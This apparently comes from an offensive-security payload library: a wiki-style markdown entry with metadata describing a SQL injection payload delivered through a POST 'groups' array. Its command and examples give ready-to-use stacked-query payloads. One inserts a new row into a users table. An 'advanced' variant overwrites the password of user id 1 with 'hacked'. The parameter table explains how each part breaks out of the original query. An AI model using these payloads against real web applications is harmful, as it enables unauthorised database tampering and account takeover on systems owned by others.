---
data: 'groups[]=1); INSERT INTO i36fd6f18_users (uname) VALUES (0x414243)#'
tags:
  - sqli
  - payload
type: command
output: New user created in users table with uname 'ABC'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.583Z'
id: 09cdc42e-fe90-43fe-bf9d-82931e89b2b4
verified: false
validated: true
submitted: true
---
# sqli-payload-insert

## Command

```bash
groups[]=1); INSERT INTO i36fd6f18_users (uname) VALUES (0x414243)#
```

## Description

SQL payload sent as POST 'groups' array to perform stacked query, closing original statement and inserting a new user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| groups | Array with payload: 1 closes IN, ); ends stmt, INSERT adds row, 0x414243='ABC', # comments rest | Yes |

## Examples

### Basic Usage

```bash
groups[]=1); INSERT INTO prefix_users (uname) VALUES (0x414243)#
```

### Advanced Usage

```bash
groups[]=1 AND 1=1; UPDATE prefix_users SET pass='hacked' WHERE uid=1#
```

## Expected Output

New user created in users table with uname 'ABC' (requires guessing prefix 'i36fd6f18_')

## Related

- [[procedures/Extract-Data-or-Modify-Database-via-SQLi]]
